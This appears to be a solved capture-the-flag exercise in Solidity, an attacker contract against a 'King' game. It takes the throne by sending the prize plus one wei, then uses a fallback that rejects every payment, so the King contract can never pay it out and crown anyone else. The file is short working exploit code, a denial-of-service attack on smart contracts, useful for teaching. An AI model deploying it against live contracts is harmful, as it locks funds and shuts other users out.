// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

error AttackingKing__UnsuccessfulCall();
contract AttackingKing {
    address public contractAddress;
    King king;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        king = King(payable(contractAddress));
        uint256 prize = king._prize();
        
        (bool success, ) = payable(king).call{value: prize + 1}("");
        
        if (!success) {
            revert AttackingKing__UnsuccessfulCall();
        }
    }

    fallback() external payable {
        revert("Refusing all transfers!");
    }
}
